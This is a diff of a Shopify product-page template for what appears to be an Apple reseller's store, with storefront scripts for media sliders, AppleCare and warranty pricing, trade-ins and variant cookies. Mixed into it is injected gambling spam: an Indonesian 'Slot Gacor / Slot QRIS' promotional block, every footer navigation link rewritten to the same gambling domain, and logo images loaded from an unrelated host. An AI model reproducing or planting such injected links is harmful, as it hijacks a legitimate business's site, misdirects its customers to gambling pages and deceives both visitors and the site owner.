+                    $('.product-media-modal__content video').each(function () {
+                        $(this).hide();
+                    });
+                    $('.product-media-modal__content deferred-media').each(function () {
+                        $(this).hide();
+                    });
+                    $('.product-media-modal__content deferred-media video').each(function () {
+                        $(this).hide();
+                    });
+                    var c1 = parseInt($(".variant-listed-image-45135258155628").length);
+
+                    var c2 = 0;
+
+                    var c3 = c1 + c2;
+
+                    var c3 = 0;
+
+                    if (c3 == 0) {
+                        $(".common_medias").each(function () {
+                            $(this).css("display", "block");
+                        });
+                        $(".variant-meta-image").each(function () {
+                            $(this).css("display", "none");
+                        });
+                        //$('.slider_media').slick('unslick');
+                        $('.slider_media').html('');
+                        $(".common_medias").each(function () {
+                            var data = $(this).find('.product__media').html()
+                            $('.slider_media').append('<li>' + data + '</li>');
+                        })
+                        $('.slider_media').slick({
+                            prevArrow: `
+          <button class="slide-arrow prev-arrow">
+            <span class="screenreader">Previous</span>
+            <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M6.75019 12.1051L7.68603 11.1692L2.86004 6.34323L7.68603 1.51724L6.75019 0.581398L0.988358 6.34323L6.75019 12.1051Z" fill="black"/>
+            </svg>
+          </button>
+        `,
+                            nextArrow: `
+          <button class="slide-arrow next-arrow">
+            <span class="screenreader">Next</span>
+            <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M1.24979 0.581417L0.313952 1.51726L5.13995 6.34325L0.313952 11.1692L1.24979 12.1051L7.01163 6.34325L1.24979 0.581417Z" fill="black"/>
+            </svg>
+          </button>
+        `
+                        });
+                        $('.slider_media').on('beforeChange', function (event, slick, currentSlide, nextSlide) {
+                            $('video').each(function () {
+                                $(this).get(0).pause();
+                            });
+                        });
+                        $('.slider_media').on('afterChange', function (event, slick, currentSlide, nextSlide) {
+                            if ($('.slick-current').find('video').length !== 0) {
+                                $(".slider_media .slick-current video")[0].play();
+                            }
+                        });
+                        $('.product-media-modal__content img').not('.custom_media_images').each(function () {
+                            $(this).show();
+                        });
+                        $('.product-media-modal__content deferred-media').each(function () {
+                            $(this).show();
+                        });
+                        $('.product-media-modal__content deferred-media video').each(function () {
+                            $(this).show();
+                        });
+                        return;
+                    }
+
+                    $('body').on('click', '.frequent-products-checkbox', function () {
+                        if ($(this).is(':checked')) {
+                            $(this).siblings('label').html(varselect);
+                        } else {
+                            $(this).siblings('label').html(varunselect);
+                        }
+                    });
+
+                    function resetErrors() {
+                        var errorMessage = document?.querySelector('.js-qty-error') || null;
+                        var qtyInput = document?.querySelector('.js-qty-input') || null;
+
+                        // reset error messaging
+                        if (errorMessage) {
+                            errorMessage.classList.add('hidden');
+                        }
+                        if (qtyInput) {
+                            qtyInput.classList.remove('quantity--error');
+                        }
+                    }
+
+                    function updateFeaturesMarkup(val) {
+                        var $container = document.querySelector('.overviewPanel');
+                        var $list = document.createElement('ul');
+                        var $content = val.innerHTML;
+
+                        if ($content && $content?.length > 0) {
+                            // Split the content by <br> tag
+                            var $items = $content.split(/<br\s*\/?>/i);
+
+                            if ($items?.length > 0) {
+                                $items = $items.map((item) => {
+                                    var $listItem = document.createElement('li');
+                                    $listItem.innerHTML = item;
+
+                                    // add li to $list
+                                    $list.appendChild($listItem);
+                                });
+
+                                // Clear the existing content
+                                val.innerHTML = '';
+                                val.appendChild($list);
+
+                                if ($container && $container?.style?.maxHeight) {
+                                    // update the max height of the container to account for the new content
+                                    $container.style.maxHeight = $container.scrollHeight + 'px';
+                                }
+                            }
+                        }
+                    }
+                });
+            </script>
+
+
+            <script>
+                $(document).ready(function () {
+                    $(document).on('click', '#apple-care-add', function (event) {
+                        var isChecked = $('#add-apple-care').is(':checked');
+                        if (isChecked) {
+                            $('#add-apple-care').prop('checked', false);
+                            $("#apple-care-add .pdp-care-btn").html("Add");
+                            // $("#apple-added-if").val("");
+                        } else {
+                            $('#add-apple-care').prop('checked', true);
+                            $("#apple-care-add .pdp-care-btn").html("Added");
+                            // $("#apple-added-if").val("added");
+                        }
+                        var appleCareID = $(this).attr("data-index");
+                        $("#apple-care-varid").val(appleCareID);
+                        updatePriceAfterAddingCareOrWarranty();
+                    });
+                    $(document).on('click', '#secWarranty-add', function (event) {
+                        var isChecked2 = $('#add-secWarranty').is(':checked');
+                        if (isChecked2) {
+                            $('#add-secWarranty').prop('checked', false);
+                            $("#secWarranty-add .pdp-secWarranty-btn").html("Add");
+                        } else {
+                            $('#add-secWarranty').prop('checked', true);
+                            $("#secWarranty-add .pdp-secWarranty-btn").html("Added");
+                            // $("#apple-added-if").val("added");
+                        }
+                        var secWarrantyID = $(this).attr("data-index");
+                        $("#secWarranty-varid").val(secWarrantyID);
+                        updatePriceAfterAddingCareOrWarranty();
+                    });
+
+                    // Reset trade-in values to 0
+                    $(document).on('click', '#no-trade-in', () => {
+                        const $tradeInValueAmounts = document.querySelectorAll('.js-trade-in-value-amount');
+                        const $startTradeInBtn = document.querySelector('.js-product-option-form .js-trade-in-modal-trigger-input');
+                        const $startTradeInBtnLabel = document.querySelector('.js-product-option-form .js-trade-in-modal-trigger-input + label');
+                        const $hiddenSelectedTradeIn = document.querySelector('#selected-trade-in-value');
+                        const $productPrices = document.querySelectorAll('.js-product-price-with-care-warranty');
+
+                        $tradeInValueAmounts.forEach(($tradeInValueAmount) => {
+                            if ($tradeInValueAmount.classList?.contains('pdp-value-amount')) {
+                                $tradeInValueAmount.innerText = '$0';
+                                $tradeInValueAmount.setAttribute('data-trade-in-value', 0);
+                                $tradeInValueAmount.parentElement?.classList?.add('hidden');
+                            }
+                        });
+
+                        $startTradeInBtnLabel.innerText = 'Start trade-in';
+                        $hiddenSelectedTradeIn.value = 0;
+
+                        updatePriceAfterRemovingTradeIn();
+                    });
+
+                    function updatePriceAfterRemovingTradeIn() {
+                        const isAppleCareAdded = $('#add-apple-care').is(':checked');
+                        const isWarrantyAdded = $('#add-secWarranty').is(':checked');
+                        const isTradeInAdded = document.querySelector('#selected-trade-in-value')?.value;
+                        const $productPrices = document.querySelectorAll('.js-product-price-with-care-warranty');
+
+                        $('.js-product-price-with-care-warranty').each((i, $productPrice) => {
+                            const price = $($productPrice).data('price');
+                            let updatedPrice;
+
+                            /* TO BE ADDED */
+                            if (isTradeInAdded && isAppleCareAdded && isWarrantyAdded) {
+                                updatedPrice = $($productPrice).attr('data-price-with-care-and-secWarranty');
+                            } else if (isTradeInAdded && isAppleCareAdded) {
+                                updatedPrice = $($productPrice).attr('data-price-with-care');
+                            } else if (isTradeInAdded && isWarrantyAdded) {
+                                updatedPrice = $($productPrice).attr('data-price-with-secWarranty');
+                            } else if (isTradeInAdded) {
+                                updatedPrice = price;
+                            } else {
+                                updatedPrice = price;
+                            }
+
+                            $($productPrice).html(updatedPrice);
+                        });
+                    }
+
+                    function updatePriceAfterAddingCareOrWarranty() {
+                        const isAppleCareAdded = $('#add-apple-care').is(':checked');
+                        const isWarrantyAdded = $('#add-secWarranty').is(':checked');
+                        const hasTradeIn = $('#selected-trade-in-value').val() && $('#selected-trade-in-value').val() !== '0' && $("#selected-trade-in-device").val() !== '';
+                        const hiddenSelectedTradeInValue = $('#selected-trade-in-value').val();
+                        const tradeInPrice = hiddenSelectedTradeInValue
+                            ? formatMoney(hiddenSelectedTradeInValue)
+                            : 0;
+
+                        $('.js-product-price-with-care-warranty').each(function (i, $productPrice) {
+                            let price = $(this).attr('data-price');
+                            const nmpPriceCalculation = $(this).data('priceCalculation');
+
+                            if (isAppleCareAdded && isWarrantyAdded && hasTradeIn) {
+                                price = setPriceWithTradeIn('data-price-with-care-and-secWarranty', $productPrice);
+                            } else if (isAppleCareAdded && isWarrantyAdded) {
+                                price = $(this).attr('data-price-with-care-and-secWarranty');
+                            } else if (isAppleCareAdded && hasTradeIn) {
+                                price = setPriceWithTradeIn('data-price-with-care', $productPrice);
+                            } else if (isWarrantyAdded && hasTradeIn) {
+                                price = setPriceWithTradeIn('data-price-with-secWarranty', $productPrice);
+                            } else if (isAppleCareAdded) {
+                                price = $(this).attr('data-price-with-care');
+                            } else if (isWarrantyAdded) {
+                                price = $(this).attr('data-price-with-secWarranty');
+                            } else if (hasTradeIn) {
+                                price = setPriceWithTradeIn('data-price', $productPrice);
+                            }
+
+                            $(this).html(price);
+                        });
+                    }
+
+                    function setCookie(name, value, days) {
+                        var expires = "";
+                        if (days) {
+                            var date = new Date();
+                            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                            expires = "; expires=" + date.toUTCString();
+                        }
+                        document.cookie = name + "=" + (value || "") + expires + "; path=/";
+                    }
+
+                    function getCookie(name) {
+                        var nameEQ = name + "=";
+                        var ca = document.cookie.split(';');
+                        for (var i = 0; i < ca.length; i++) {
+                            var c = ca[i];
+                            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+                            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+                        }
+                        return null;
+                    }
+
+                    function eraseCookie(name) {
+                        document.cookie = name + '=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+                    }
+
+                    //added by anusha - 4th variant option cookie approach - start
+
+                    //check if the main product is inside 4th option product list. if its present, set cookie array
+                    var pid = "8845196638866";
+                    var pid1 = "";
+                    var pid1 = pid1.replace(/\s/g, "");
+                    var pid2 = pid1.split('-');
+                    var count = 0;
+                    for (var j = 0; j < pid2.length; j++) {
+                        var a = pid2[j];
+                        var b = pid;
+                        if (a.trim() == b.trim()) {
+                            count++;
+                        }
+                    }
+                    if (count > 0) {
+                        setCookie('optionPIDlist', pid2.join('|'), {
+                            path: '/'
+                        });
+                    }
+
+                    // if the main product has 'empty 4th product list', then delete all the cookies
+                    if (!pid1.length > 0) {
+                        eraseCookie('option1select');
+                        eraseCookie('option2select');
+                        eraseCookie('option3select');
+                        eraseCookie('optionPIDlist');
+                    }
+
+                    // cookie values - 3 options
+                    let op1 = getCookie('option1select');
+                    let op2 = getCookie('option2select');
+                    let op3 = getCookie('option3select');
+
+                    // when customer change the 4th option selection - trigger click event (inorder to set cookie values for 3 options)
+                    if (op1 && $('fieldset.product-form__input[data-opcount="1"]').length > 0) {
+                        setTimeout(function () {
+                            $('fieldset.product-form__input[data-opcount="1"]').find('label[data-title="' + op1 + '"]').trigger('click');
+                        }, 1000);
+                    };
+                    if (op2 && $('fieldset.product-form__input[data-opcount="2"]').length > 0) {
+                        setTimeout(function () {
+                            $('fieldset.product-form__input[data-opcount="2"]').find('label[data-title="' + op2 + '"]').trigger('click');
+                        }, 1000);
+                    };
+                    if (op3 && $('fieldset.product-form__input[data-opcount="3"]').length > 0) {
+                        setTimeout(function () {
+                            $('fieldset.product-form__input[data-opcount="3"]').find('label[data-title="' + op3 + '"]').trigger('click');
+                        }, 1000);
+                    };
+
+                    let op11 = $("input[type='radio'][name='Title']:checked").val();
+                    let op22 = $("input[type='radio'][name='']:checked").val();
+                    let op33 = $("input[type='radio'][name='']:checked").val();
+
+                    // when customer dont click on any of the variant buttons - set cookie values for 3 options from current mainprod variant selection
+                    if (op1 == null && op2 == null && op3 == null) {
+                        if (op11 && $('fieldset.product-form__input[data-opcount="1"]').length > 0) {
+                            setTimeout(function () {
+                                $('fieldset.product-form__input[data-opcount="1"]').find('label[data-title="' + op11 + '"]').trigger('click');
+                            }, 1000);
+                        };
+                        if (op22 && $('fieldset.product-form__input[data-opcount="2"]').length > 0) {
+                            setTimeout(function () {
+                                $('fieldset.product-form__input[data-opcount="2"]').find('label[data-title="' + op22 + '"]').trigger('click');
+                            }, 1000);
+                        };
+                        if (op33 && $('fieldset.product-form__input[data-opcount="3"]').length > 0) {
+                            setTimeout(function () {
+                                $('fieldset.product-form__input[data-opcount="3"]').find('label[data-title="' + op33 + '"]').trigger('click');
+                            }, 1000);
+                        };
+                        if (getCookie('optionPIDlist')) {
+                            setCookie('option1select', op11, 7);
+                            setCookie('option2select', op22, 7);
+                            setCookie('option3select', op33, 7);
+                        }
+                    }
+                    // added by anusha - 4th variant option cookie approach - end
+
+                    if (vat_free_day == true) {
+                        var vat_price_footer = $(".pricestyle").find(".vat_price_bold").text();
+                        if (vat_price_footer != "") {
+                            $("#price-element").find(".footerOr2").css("display", "none");
+                        }
+                    }
+                });
+            </script>
+
+
+
+            <script>
+                $(document).on('change', 'input[type="number"]', function (event) {
+                    this.value = this.value.replace(/[^0-9]+/g, '');
+                    if (this.value < 1) this.value = 0;
+                });
+                $(document).on('keypress', 'input[type="number"]', function (event) {
+                    if (
+                        (event.target.value.length == 0 && event.which == 48) ||
+                        (event.target.value.length == 0 && event.which > 31 && event.which < 48) ||
+                        (event.target.value.length == 0 && event.which > 57 && event.which < 128)
+                    ) {
+                        return false;
+                    }
+                });
+                $(document).on('keypress', 'input[type="number"]', function (event) {
+                    return (((event.which > 47) && (event.which < 58)) || (event.which == 13));
+                });
+
+                // reload page on back button click since the cached version on Safari browsers is incorrect
+                $(window).bind("pageshow", function (event) {
+                    if (event.originalEvent.persisted) {
+                        window.location.reload();
+                    }
+                });
+            </script>
+
+
+            <style data-shopify>
+                .add-on-product-style.add-on-product-style-secWarranty .care-pdp-title {
+                    /*     margin-left: 0; */
+                }
+            </style>
+
+
+            <style>
+                #shopify-section-template--17605519376564__main .accordion__content p a {
+                    color: var(--color-link-dynamic-label) !important;
+                }
+
+                #shopify-section-template--17605519376564__main .popup_round_border {
+                    display: none;
+                }
+            </style>
+        </section>
+    
+        <div id="shopify-section-template--17605519376564__productMarketingContent" class="shopify-section">
+            <link
+                href="//www.istudiosg.com/cdn/shop/t/14/assets/productMarketingContent.css?v=134348870364535945721742784887"
+                rel="stylesheet" type="text/css" media="all" />
+            <div class="page-width productcomparediv" style="box-shadow: 0 8px 20px #ff9900; background-color: #000;">
+                <h1 style="color: #ffd900;">SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI</h1>
+
+                <p style="text-align: justify; padding: 10px;">Slot Qris hadir sebagai platform <a href="https://tunari-online.ro/">Slot Gacor</a> terpercaya yang fokus menyediakan beragam jenis permainan slot dengan update terbaru tahun 2026. Seluruh informasi untuk rtp tingkat kemenangan game slot gacor di rilis secara akurat untuk para member supaya mendapatkan kemenangan maxwin di hari ini.</p>
+                <p style="text-align: justify; padding: 10px;">Sebagai pusat data <a href="https://tunari-online.ro/">slot maxwin</a>, slot qris memberikan <a href="https://tunari-online.ro/">rtp slot</a> yang tersusun rapi dan mudah dipahami. Mulai dari tingkat kemenangan slot yang sedang gacor di hari ini, semua disajikan secara lengkap untuk membantu pemain untuk memenangkan game slot gacor hari ini.</p>
+                <p style="text-align: justify; padding: 10px;">Selain keakuratan data, Slot qris juga mengutamakan kenyamanan akses bagi pengguna. Situs dapat dibuka melalui berbagai perangkat dengan sistem stabil dan tampilan responsif. <a href="https://tunari-online.ro/">Slot</a> menjadi pilihan tepat untuk tempat bermainan game gacor untuk mendapatkan kemenangan di setiap hari.</p>
+                <style>
+                    .social_media {
+
+                        background-color: #e6e6e6;
+                        border-radius: 20px;
+                        border: 2px solid #ffffff;
+                    }
+
+                    .popup-container iframe {
+                        margin-left: -45px !important;
+                        width: 110% !important;
+                        height: 100% !important;
+                        border: none;
+                    }
+
+                    @media screen and (max-width: 1023px) {
+                        .popup-container iframe {
+                            width: 100% !important;
+                            margin-left: auto !important;
+                            margin-right: auto !important;
+                        }
+                    }
+
+                    .accordion1 {
+                        background-color: #ffffff;
+                        border-radius: 8px;
+                        margin-bottom: 10px;
+                    }
+
+                    .panel1 {
+                        background-color: #ffffff;
+                        max-height: 0;
+                        overflow: hidden;
+                        transition: max-height .2s ease-out;
+                        border-bottom: .1rem solid rgba(var(--color-foreground), .08);
+                    }
+                </style>
+            </div>
+            <section id="shopify-section-template--17605519376564__frequently-bought-products"
+                class="shopify-section section slider-container">
+                <style data-shopify>
+                    .section-template--17605519376564__frequently-bought-products-padding {
+                        padding-top: 27px;
+                        padding-bottom: 0px;
+                    }
+
+                    @media screen and (min-width: 750px) {
+                        .section-template--17605519376564__frequently-bought-products-padding {
+                            padding-top: 36px;
+                            padding-bottom: 0px;
+                        }
+                    }
+
+                    #shopify-section-template--17605519376564__frequently-bought-products .button-cart-frequent.hide {
+                        animation: hide 0.4s ease-in-out forwards;
+                    }
+
+                    @keyframes hide {
+                        0% {
+                            opacity: 1;
+                            display: block;
+                        }
+
+                        100% {
+                            opacity: 0;
+                            display: none;
+                        }
+                    }
+                </style>
+                <link rel="stylesheet"
+                    href="//www.istudiosg.com/cdn/shop/t/14/assets/product-scratch.css?v=179858087556892581742784887"
+                    media="print" onload="this.media='all'">
+
+
+
+
+
+        </div>
+
+    </main>
+
+    <!-- BEGIN sections: footer-group -->
+    <div id="shopify-section-sections--17605520064692__footer"
+        class="shopify-section shopify-section-group-footer-group">
+
+
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/section-footer.css?v=119412480688511735931742784889"
+            rel="stylesheet" type="text/css" media="all" />
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-newsletter.css?v=35697508531179068801742784889"
+            rel="stylesheet" type="text/css" media="all" />
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-list-menu.css?v=104864129994713251501742784888"
+            rel="stylesheet" type="text/css" media="all" />
+        <link
+            href="//www.istudiosg.com/cdn/shop/t/14/assets/component-list-payment.css?v=176967998584360591851742784888"
+            rel="stylesheet" type="text/css" media="all" />
+        <link href="//www.istudiosg.com/cdn/shop/t/14/assets/component-list-social.css?v=35792976012981934991742784887"
+            rel="stylesheet" type="text/css" media="all" />
+        <style data-shopify>
+            .footer {
+                margin-top: 18px;
+            }
+
+            .active_2,
+            .accordion2:after {
+                color: #121212;
+            }
+
+            .section-sections--17605520064692__footer-padding {
+                /* padding-top: 0px; */
+                padding-bottom: 0px;
+            }
+
+            @media screen and (min-width: 750px) {
+                .footer {
+                    margin-top: 24px;
+                }
+
+                .section-sections--17605520064692__footer-padding {
+                    padding-top: 0px;
+                    padding-bottom: 0px;
+                }
+            }
+        </style>
+        <footer class="footer color-background-1 gradient section-sections--17605520064692__footer-padding">
+            <div id="footerAccordion" class="accordionpadding page-width ">
+                <div class="borderTop">
+
+                    <div class="accordion2 ">
+                        <span class="headerBlu footer-block__heading">Products</span>
+                        <span class="caretfooter">
+                            <svg aria-hidden="true" focusable="false" role="presentation"
+                                class="footercareticon icon icon-caret " viewBox="0 0 10 6">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                    fill="currentColor" class="footercareticon">
+                                </path>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="panel2">
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Mac
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    iPad
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    iPhone
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Watch
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Music
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    TV & Home
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Accessories
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Offers
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="accordion2 ">
+                        <span class="headerBlu footer-block__heading">Services</span>
+                        <span class="caretfooter">
+                            <svg aria-hidden="true" focusable="false" role="presentation"
+                                class="footercareticon icon icon-caret " viewBox="0 0 10 6">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                    fill="currentColor" class="footercareticon">
+                                </path>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="panel2">
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    AppleCare+
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Corporate
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Demo Sessions
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Elush Service Provider
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Financing Options
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Trade-in
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Traveller’s Reservation
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="accordion2 ">
+                        <span class="headerBlu footer-block__heading">Support</span>
+                        <span class="caretfooter">
+                            <svg aria-hidden="true" focusable="false" role="presentation"
+                                class="footercareticon icon icon-caret " viewBox="0 0 10 6">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                    fill="currentColor" class="footercareticon">
+                                </path>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="panel2">
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    My Account
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Collection & Delivery
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Returns & Exchanges
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Contact Us
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    FAQ
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Privacy Policy
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Site Terms of Use
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="accordion2 ">
+                        <span class="headerBlu footer-block__heading">About iStudio</span>
+                        <span class="caretfooter">
+                            <svg aria-hidden="true" focusable="false" role="presentation"
+                                class="footercareticon icon icon-caret " viewBox="0 0 10 6">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                    fill="currentColor" class="footercareticon">
+                                </path>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="panel2">
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    About Us
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Find an iStudio near you
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Why Shop at iStudio
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    Elush Corporate Website
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="accordion2 ">
+                        <span class="headerBlu footer-block__heading">Apple Premium Partner</span>
+                        <span class="caretfooter">
+                            <svg aria-hidden="true" focusable="false" role="presentation"
+                                class="footercareticon icon icon-caret " viewBox="0 0 10 6">
+                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                    d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                    fill="currentColor" class="footercareticon">
+                                </path>
+                            </svg>
+                        </span>
+                    </div>
+                    <div class="panel2">
+                        <div class="subtext_css footer-block__details-content rte">
+
+                        </div>
+                    </div>
+                    <div class="footer_logosMobile">
+                        <div class="footerLogo ">
+                            <div class="ratio" style="--ratio-percent: 46.97508896797152%">
+                                <img srcset="https://aduhhenakmasssini.space/hubton/favicon.png"
+                                    src="https://aduhhenakmasssini.space/hubton/favicon.png"
+                                    alt="" loading="lazy" width="100" height="auto"
+                                    style="max-width: min(100%, 100px);">
+                            </div>
+                        </div>
+                        <div class="footerLogo ">
+                            <div class="ratio" style="--ratio-percent: 25.396825396825395%">
+                                <img srcset="https://aduhhenakmasssini.space/hubton/favicon.png"
+                                    src="https://aduhhenakmasssini.space/hubton/favicon.png"
+                                    alt="" loading="lazy" width="130" height="auto"
+                                    style="max-width: min(100%, 130px);">
+                            </div>
+                        </div>
+                        <div class="footerLogo "><svg class="placeholder-svg placeholder"
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 525.5 525.5">
+                                <path
+                                    d="M324.5 212.7H203c-1.6 0-2.8 1.3-2.8 2.8V308c0 1.6 1.3 2.8 2.8 2.8h121.6c1.6 0 2.8-1.3 2.8-2.8v-92.5c0-1.6-1.3-2.8-2.9-2.8zm1.1 95.3c0 .6-.5 1.1-1.1 1.1H203c-.6 0-1.1-.5-1.1-1.1v-92.5c0-.6.5-1.1 1.1-1.1h121.6c.6 0 1.1.5 1.1 1.1V308z" />
+                                <path
+                                    d="M210.4 299.5H240v.1s.1 0 .2-.1h75.2v-76.2h-105v76.2zm1.8-7.2l20-20c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l1.5 1.5 16.8 16.8c-12.9 3.3-20.7 6.3-22.8 7.2h-27.7v-5.5zm101.5-10.1c-20.1 1.7-36.7 4.8-49.1 7.9l-16.9-16.9 26.3-26.3c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l27.5 27.5v7.8zm-68.9 15.5c9.7-3.5 33.9-10.9 68.9-13.8v13.8h-68.9zm68.9-72.7v46.8l-26.2-26.2c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-26.3 26.3-.9-.9c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-18.8 18.8V225h101.4z" />
+                                <path
+                                    d="M232.8 254c4.6 0 8.3-3.7 8.3-8.3s-3.7-8.3-8.3-8.3-8.3 3.7-8.3 8.3 3.7 8.3 8.3 8.3zm0-14.9c3.6 0 6.6 2.9 6.6 6.6s-2.9 6.6-6.6 6.6-6.6-2.9-6.6-6.6 3-6.6 6.6-6.6z" />
+                            </svg>
+                        </div>
+                    </div>
+
+
+                </div>
+            </div>
+
+            <div class="footer__content-top page-width">
+                <div
+                    class="js-footer-blocks-wrapper footer__blocks-wrapper grid grid--1-col grid--2-col grid--4-col-tablet grid--5-col-desktop grid--5-col-desktop">
+                    <div class="footer-block grid__item footer-block--menu">
+                        <p class="footer-block__heading inline-richtext">Products</p>
+                        <ul class="footer-block__details-content list-unstyled">
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    SLOT QRIS
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    SLOT
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    SLOT GACOR
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    SLOT GACOR MAXWIN
+                                </a>
+                            </li>
+                            <li>
+                                <a href="https://tunari-online.ro/"
+                                    class="footer_content_list link link--text list-menu__item list-menu__item--link">
+                                    SITUS GACOR
+                                </a>
+                            </li>
+                            <li>
